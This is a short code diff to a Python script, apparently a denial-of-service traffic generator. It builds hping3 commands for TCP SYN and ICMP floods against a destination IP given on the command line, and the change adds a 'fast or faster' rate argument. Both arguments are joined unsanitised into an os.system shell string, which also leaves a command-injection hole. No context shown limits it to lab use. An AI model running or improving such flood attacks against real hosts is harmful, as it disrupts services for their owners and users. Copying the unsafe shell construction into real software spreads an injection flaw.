@@ -34,8 +34,8 @@ def stats():
 
 if __name__ == "__main__":
 	# Check the passed arguments
-	if len(sys.argv) != 2:
-		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP>')
+	if len(sys.argv) != 3:
+		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <mode: fast or faster> <Destination IP>')
 		exit(-1)
 
 	# Initialize status variables
@@ -47,10 +47,10 @@ if __name__ == "__main__":
 
 	# hping3 for TCP DDoS
 	if TCP_DDoS:
-		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 2222 --fast ' + sys.argv[1])
+		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 2222 --' + sys.argv[1] + ' ' + sys.argv[2])
 	# hping3 for ICMP DDoS
 	if ICMP_DDoS:
-		os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])
+		os.system('hping3 -V -1 -d 1400 --' + sys.argv[1] + ' ' + sys.argv[2])
 
 	# Show the stats
 	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
